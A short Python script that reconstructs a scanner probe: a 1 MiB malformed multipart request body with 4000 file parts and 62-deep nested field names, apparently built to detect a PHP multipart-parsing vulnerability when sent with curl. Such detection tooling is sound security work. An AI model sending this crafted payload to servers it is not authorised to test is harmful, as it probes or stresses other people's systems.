#!/usr/bin/env python3
# Rebuild assetnote php2shell-scanner probe 1 (1 MiB, 4000 parts, 62 nested keys)
# byte-for-byte, so it can be sent with curl. Usage: python3 make_probe.py [out_file]
import sys

size = 1 << 20                                   # 1 MiB
name = b"a[]" + b"[a]" * 62                      # a[][a][a]...  (62 deep)
part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
base = part * 4000                               # 4000 empty file parts
filler = (size - len(base)) // 3
body = (b"--\n" + b"x:\n" * filler + base[3:])[:-1]

out = sys.argv[1] if len(sys.argv) > 1 else "probe1.bin"
with open(out, "wb") as f:
    f.write(body)
print(f"wrote {out} ({len(body)} bytes)")
